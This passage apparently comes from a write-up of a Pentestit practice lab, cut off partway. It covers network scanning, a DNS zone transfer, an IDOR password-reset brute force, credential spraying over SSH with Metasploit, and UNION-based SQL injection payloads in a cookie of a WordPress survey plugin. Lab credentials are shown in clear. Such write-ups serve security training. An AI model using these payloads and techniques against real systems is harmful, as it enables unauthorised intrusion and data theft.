&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A nmap scan with the fast (-F) option can be conducted to quickly find open services. It is worth disabling host discovery within nmap for better coverage.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -F -n 172.16.0.0/16 -v -Pn
[SHORTENED FOR ABBREVIATION]

Nmap scan report for 172.16.0.10
Host is up (0.10s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.0.17
Host is up (0.10s latency).
Not shown: 89 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
389/tcp  open  ldap
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 172.16.2.10
Host is up (0.051s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
53/tcp open  domain


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The results discovered multiple DNS servers. One of these DNS servers allowed zone transfers.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# dig axfr test.lab @172.16.2.10

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-P2-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr test.lab @172.16.2.10
;; global options: +cmd
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
test.lab.		21600	IN	NS	ns1.test.lab.
test.lab.		21600	IN	NS	ns2.test.lab.
test.lab.		21600	IN	A	172.16.0.17
_kerberos._tcp.dc._msdcs.test.lab. 21600 IN SRV	0 0 88 test.lab.
_ldap._tcp.dc._msdcs.test.lab. 21600 IN	SRV	0 0 389 test.lab.
gc._msdcs.test.lab.	21600	IN	A	172.16.0.17
_ldap._tcp.gc._msdcs.test.lab. 21600 IN	SRV	0 0 3268 test.lab.
_kerberos._tcp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._tcp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
_ldap._tcp.test.lab.	21600	IN	SRV	0 0 389 test.lab.
_kerberos._udp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._udp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
ad.test.lab.		21600	IN	A	172.16.0.17
db.test.lab.		21600	IN	A	172.16.0.30
dc.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.2.10
_ldap._tcp.ForestDnsZones.test.lab. 21600 IN SRV 0 0 389 test.lab.
helpdesk.test.lab.	21600	IN	A	172.16.0.10    
my.test.lab.		21600	IN	A	172.16.0.10
ns1.test.lab.		21600	IN	A	172.16.0.17
ns2.test.lab.		21600	IN	A	172.16.2.10
site.test.lab.		21600	IN	A	172.16.0.10
[TOKENREMOVEDFROM].test.lab. 21600 IN	A	127.0.0.1
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
;; Query time: 169 msec
;; SERVER: 172.16.2.10#53(172.16.2.10)
;; WHEN: Sat Jan 19 18:14:26 EST 2019
;; XFR size: 26 records (messages 1, bytes 778
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The DNS token was discovered within the given results.&lt;/p&gt;

&lt;h3 id=&quot;helpdesk-token&quot;&gt;Helpdesk Token&lt;/h3&gt;

&lt;p&gt;The IP address and the correct hostname for the helpdesk system can be discovered through the obtain DNS records. A quick port scan revealed that this machine is hosting a web application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/5.JPG&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The previously obtained info user credentials can be used to login in to this application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.png&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observing the change password area of the helpdesk discovered the use of an obfuscated ID parameter which could potentially be vulnerable to Insecure Direct Object Reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The value of the ID parameter was found to be Base64 decoded. An decoded example of this value can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/7.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By iterating through a list of parameter values, it could be possible to reset the password for the sviridov user. It should be noted that to generate valid values for the ID parameter, a list of numbers should be generate with a new line at the end. The following PHP code can be used to generate these values.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php  
for ($x = 0; $x &amp;lt;= 500; $x++) {
    echo base64_encode($x.'
');
    echo '&amp;lt;br&amp;gt;';
}
?&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This payload list can now be used with Burp Intruder to reset the password of the sviridov user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/8.JPG&quot; alt=&quot;alt text&quot; title=&quot;intruder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The helpdesk token and the network password of the sviridov user can be found by logging in to the Helpdesk application with the changed password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/9.JPG&quot; alt=&quot;alt text&quot; title=&quot;sviridov&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ad-token&quot;&gt;AD Token&lt;/h3&gt;

&lt;p&gt;The domain controller IP address in use for the TEST domain can be found by looking through the DNS records found earlier through the DNS Zone transfer. By conducting a authenticated NetBIOS using enum4linux, information about the domain can be gathered including the AD token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/var/www/html# enum4linux -u 'sviridov@test.lab' -p '5BEiBBtrNq695A!6u5zUR5KxC' -U 172.16.0.17 -a
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 27 10:02:59 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.0.17
RID Range ........ 500-550,1000-1050
Username ......... 'sviridov@test.lab'
Password ......... '5BEiBBtrNq695A!6u5zUR5KxC'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 172.16.0.17    |
 =================================================== 
[+] Got domain/workgroup name: TEST

 ==================================== 
|    Session Check on 172.16.0.17    |
 ==================================== 
[+] Server 172.16.0.17 allows sessions using username 'sviridov@test.lab', password '5BEiBBtrNq695A!6u5zUR5KxC'

 ========================================== 
|    Getting domain SID for 172.16.0.17    |
 ========================================== 
Domain Name: TEST
Domain Sid: S-1-5-21-583374519-1042395902-3096671009
[+] Host is part of a domain (not a workgroup)

 ============================ 
|    Users on 172.16.0.17    |
 ============================ 
index: 0x1 RID: 0x45e acb: 0x00000010 Account: token_fopekr0mf	Name: 	Desc: 
index: 0x2 RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: 	Desc: Built-in account for administering the computer/domain
index: 0x3 RID: 0x457 acb: 0x00000010 Account: lomonosov	Name: 	Desc: 
index: 0x4 RID: 0x452 acb: 0x00000010 Account: sviridov	Name: 	Desc: 
index: 0x5 RID: 0x454 acb: 0x00000010 Account: sidorov	Name: 	Desc: 
index: 0x6 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: 	Desc: Key Distribution Center Service Account
index: 0x7 RID: 0x456 acb: 0x00000010 Account: petrov	Name: 	Desc: 
index: 0x8 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: 	Desc: Built-in account for guest access to the computer/domain
index: 0x9 RID: 0x450 acb: 0x00000010 Account: info	Name:  info	Desc: 

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[info] rid:[0x450]
user:[sviridov] rid:[0x452]
user:[sidorov] rid:[0x454]
user:[petrov] rid:[0x456]
user:[lomonosov] rid:[0x457]
user:[token_fopekr0mf] rid:[0x45e]
enum4linux complete on Sun Jan 27 10:03:06 2019

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vpn-token&quot;&gt;VPN Token&lt;/h3&gt;

&lt;p&gt;The initial information provided by Pentestit was that lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;. 192.168.101.13 was accessible by downloading the VPN configuration obtained through the mail token challenge.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/10.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpn&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The VPN configuration can be modified to connect to the 192.168.101.12 VPN. The sviridov credentials previously obtained will need to be used for successful authentication.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ip ro show dev tun1
10.12.0.1 via 10.12.0.145 
10.12.0.145 proto kernel scope link src 10.12.0.146 
172.16.0.0/16 via 10.12.0.145 
192.168.0.0/24 via 10.12.0.145
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The same 172 network range seems to be accessible but network Access Control Lists might not been in place. A port scan of this range revealed the following systems&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host is up, received user-set (0.074s latency).
Scanned at 2019-01-27 13:20:40 EST for 66s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.11
Host is up, received user-set (0.058s latency).
Scanned at 2019-01-27 13:20:40 EST for 68s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
25/tcp  open  smtp    syn-ack
143/tcp open  imap    syn-ack

Nmap scan report for 172.16.0.14
Host is up, received user-set (0.076s latency).
Scanned at 2019-01-27 13:20:40 EST for 67s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.17
Host is up, received user-set (0.067s latency).
Scanned at 2019-01-27 13:20:40 EST for 62s
Not shown: 75 closed ports, 19 filtered ports
Reason: 75 conn-refused and 19 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
53/tcp  open  domain       syn-ack
135/tcp open  msrpc        syn-ack
139/tcp open  netbios-ssn  syn-ack
389/tcp open  ldap         syn-ack
445/tcp open  microsoft-ds syn-ack

Nmap scan report for 172.16.1.10
Host is up, received user-set (0.080s latency).
Scanned at 2019-01-27 14:26:04 EST for 180s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.12
Host is up, received user-set (0.063s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.15
Host is up, received user-set (0.068s latency).
Scanned at 2019-01-27 14:26:04 EST for 182s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.20
Host is up, received user-set (0.087s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Nmap scan report for 172.16.1.25
Host is up, received user-set (0.15s latency).
Scanned at 2019-01-27 14:26:04 EST for 177s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Browsing to port 80 using a web browser revealed the following token&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/11.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnhost&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;siem-token&quot;&gt;SIEM Token&lt;/h3&gt;

&lt;p&gt;By browsing to the IP 172.16.1.12 found from the previous Nmap scan, a prewikka prelude SIEM console can be discovered. By trying the previously found credentials for sviridov, authentication to this console was successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/12.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking through the console, and by looking at logs from previous 6 months, a few things can be concluded:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The IP address of the repository (repository.test.lab) system is 172.16.1.15&lt;/li&gt;
  &lt;li&gt;The IP address 172.16.1.10 belongs to vpn-admin.test.lab&lt;/li&gt;
  &lt;li&gt;The correct domain name for the SIEM system is siem.test.lab&lt;/li&gt;
  &lt;li&gt;The agents running to obtain SIEM data are both disabled&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;An overview of these logs can be seen below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/13.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The token for SIEM can be found under the additional data section for the “User missed the password to change UID (user id)” alert belonging to the Repository system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/14.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another interesting alert “Unknown problem somewhere in the system” also gives information regarding a user and potential password for the repository system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/15.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;repository-token&quot;&gt;Repository Token&lt;/h3&gt;

&lt;p&gt;Using the found credentials from the previous SIEM log, access to the repository system can be obtained using the “admin:IFGpajdlkmaw2of” credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/16.jpg&quot; alt=&quot;alt text&quot; title=&quot;repository1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This webserver contains an unknown binary, a jar file, and a file called token with no extension. The token file is a ASCII text that contains the token for repository.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/17.jpg&quot; alt=&quot;alt text&quot; title=&quot;repository2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;users-token&quot;&gt;Users Token&lt;/h3&gt;

&lt;p&gt;Scanning the “192.168.0.0/24” range shows numerous SSH services being availiable externally. A quick Nmap scan can be done to rediscover these results.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/pentestit# nmap -sS -n -vvv 192.168.0.0/24 -Pn -p 21,22,80,139,443,445,8080,3389 --open

Nmap scan report for 192.168.0.10
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.15
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.30
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.100
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.205
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.240
22/tcp open  ssh     syn-ack ttl 62
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The credentials previously recovered for “sviridov” and “admin” user can be sprayed across these services using Crackmapexec or Metasploit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfconsole -nq
[-] ***
[-] * WARNING: Database support has been disabled
[-] ***
msf5 &amp;gt; use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set USERNAME sviridov@test.lab
USERNAME =&amp;gt; sviridov@test.lab
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set PASSWORD 5BEiBBtrNq695A!6u5zUR5KxC
PASSWORD =&amp;gt; 5BEiBBtrNq695A!6u5zUR5KxC
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set RHOSTS file:/root/sshhosts.txt
RHOSTS =&amp;gt; file:/root/sshhosts.txt
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting            Required  Description
   ----              ---------------            --------  -----------
   BLANK_PASSWORDS   false                      no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                          yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                      no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                      no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                      no        Add all users in the current database to the list
   PASSWORD          5BEiBBtrNq695A!6u5zUR5KxC  no        A specific password to authenticate with
   PASS_FILE                                    no        File containing passwords, one per line
   RHOSTS            file:/root/sshhosts.txt    yes       The target address range or CIDR identifier
   RPORT             22                         yes       The target port
   STOP_ON_SUCCESS   false                      yes       Stop guessing when a credential works for a host
   THREADS           1                          yes       The number of concurrent threads
   USERNAME          sviridov@test.lab          no        A specific username to authenticate as
   USERPASS_FILE                                no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                      no        Try the username as the password for all users
   USER_FILE                                    no        File containing usernames, one per line
   VERBOSE           false                      yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.0.10:22 - Success: 'sviridov@test.lab:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 1 opened (10.12.0.10:40079 -&amp;gt; 192.168.0.10:22) at 2019-05-06 06:17:03 -0400
[*] Scanned 1 of 6 hosts (16% complete)
[*] Scanned 2 of 6 hosts (33% complete)
[*] Scanned 3 of 6 hosts (50% complete)
[*] Scanned 4 of 6 hosts (66% complete)
[*] Scanned 5 of 6 hosts (83% complete)
[*] Scanned 6 of 6 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set USERNAME sviridov
USERNAME =&amp;gt; sviridov
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.0.10:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 2 opened (10.12.0.10:44971 -&amp;gt; 192.168.0.10:22) at 2019-05-06 06:18:57 -0400
[*] Scanned 1 of 6 hosts (16% complete)
[+] 192.168.0.15:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux sidorov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 3 opened (10.12.0.10:42259 -&amp;gt; 192.168.0.15:22) at 2019-05-06 06:19:00 -0400
[*] Scanned 2 of 6 hosts (33% complete)
[+] 192.168.0.30:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux petrov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 4 opened (10.12.0.10:34513 -&amp;gt; 192.168.0.30:22) at 2019-05-06 06:19:03 -0400
[*] Scanned 3 of 6 hosts (50% complete)
[+] 192.168.0.100:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 5 opened (10.12.0.10:32987 -&amp;gt; 192.168.0.100:22) at 2019-05-06 06:19:06 -0400
[*] Scanned 4 of 6 hosts (66% complete)
[*] Scanned 5 of 6 hosts (83% complete)
[+] 192.168.0.240:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux sviridov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 6 opened (10.12.0.10:42965 -&amp;gt; 192.168.0.240:22) at 2019-05-06 06:19:11 -0400
[*] Scanned 6 of 6 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The sviridov user credentials can be used to login to multiple servers. Searching the servers gives you information regarding other users of network  info,lomonosov,petrov,sidorov and sviridov.&lt;/p&gt;

&lt;p&gt;On the 192.168.0.100 server, access to the sidorov user’s home directory was possible and this directory cotained the Users token.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ssh sviridov@192.168.0.100
sviridov@192.168.0.100's password:  
Warning: Your password will expire in 852 days on Sat Sep  4 18:48:18 2021
Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
Last login: Mon May  6 13:18:41 2019 from 10.12.0.10
##########################
PasswordAuthentication yes
##########################
sviridov@lomonosov:~$ ls -la
total 8
dr-x------ 2 sviridov root 4096 Dec 13 20:21 .
drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..
sviridov@lomonosov:~$ cd ../
sviridov@lomonosov:/home/TEST$ ls
info  lomonosov  petrov  sidorov  sviridov
sviridov@lomonosov:/home/TEST$ cd sidorov/
sviridov@lomonosov:/home/TEST/sidorov$ ls -la
total 12
dr-x---r-x 2 sidorov  root 4096 Dec 13 20:42 .
drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..
-r-x------ 1 sviridov root   23 Dec 13 20:40 .token
sviridov@lomonosov:/home/TEST/sidorov$ cat .token 
FGui83OIHFG80tuy38rfny
sviridov@lomonosov:/home/TEST/sidorov$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;site-token&quot;&gt;Site Token&lt;/h3&gt;

&lt;p&gt;Previous enumeration of the DNS server successfully identified the IP address of the site application to be 172.16.0.10. This application hosted a WordPress CMS system that was identified during the beginnning this network. However, exploitation of this application was not possible due to a web application firewall in place. However, if you browse the application IP address directly after VPNing as the Sidorov user to the 172.16.0.0/16 subnet, the WAF can be bypassed. An Nmap scan of the 172.16.0.0/16 range identified a HTTP service running on port 80 on the IP address 172.16.0.14. It can be assumed that this is the direct IP address of the WordPress system.&lt;/p&gt;

&lt;p&gt;WPScan can be run again to identify outdated plugins and themes: &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url http://site.test.lab --random-user-agent&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Looking through the scan results, the following result could be intersting.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] wp-survey-and-poll
 | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
 | Last Updated: 2019-01-17T15:32:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8.1
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.7.8 (50% confidence)
 | Detected By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Previous exploitation of this plugin using the SQL Injection exploit found from exploit-db (https://www.exploit-db.com/exploits/45411) was not possible. Retest of this vulnerability resulted in successful exploitation.&lt;/p&gt;

&lt;p&gt;By modifying the ‘wp_sap’ cookie set by the plugin, it can be modified to a SQL Injection payload as specified by the exploit-db information. An example of this can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11 #&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;When injected, the @@version function will return information regarding the underlying database software.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/18.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;database()&lt;/code&gt; function can be used to find the current database that the application is interacting with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/19.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By querying the information_schema database, a list of all tables avaiable on the MySQL can be identified.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,table_name,11 from information_schema.tables #&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; var sss_params = {&quot;survey_options&quot;:&quot;{\&quot;options\&quot;:\&quot;[\\\&quot;bottom\\\&quot;,\\\&quot;easeInOutBack\\\&quot;,\\\&quot;\\\&quot;,\\\&quot;linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\&quot;,\\\&quot;rgb(81, 81, 81)\\\&quot;,\\\&quot;rgb(188, 188, 188)\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;5\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,1000,\\\&quot;So, mr. Hacker, the die is cast.\\\&quot;,\\\&quot;0\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;0\\\&quot;]\&quot;,\&quot;plugin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\&quot;,\&quot;admin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-admin\\\/admin-ajax.php\&quot;,\&quot;survey_id\&quot;:\&quot;242178939\&quot;,\&quot;style\&quot;:\&quot;modal\&quot;,\&quot;expired\&quot;:\&quot;false\&quot;,\&quot;debug\&quot;:\&quot;true\&quot;,\&quot;questions\&quot;:[[\&quot;Ready to show who is mr. 